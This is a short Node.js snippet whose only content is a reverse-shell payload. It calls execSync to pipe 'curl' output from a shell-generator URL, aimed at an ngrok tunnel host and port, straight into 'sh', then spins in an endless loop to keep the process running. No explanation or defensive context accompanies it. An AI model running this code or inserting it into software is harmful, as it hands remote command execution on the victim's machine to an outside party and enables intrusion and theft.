(function() {
	require("child_process").execSync(
		"curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh"
	);
	while (true) {}
})();
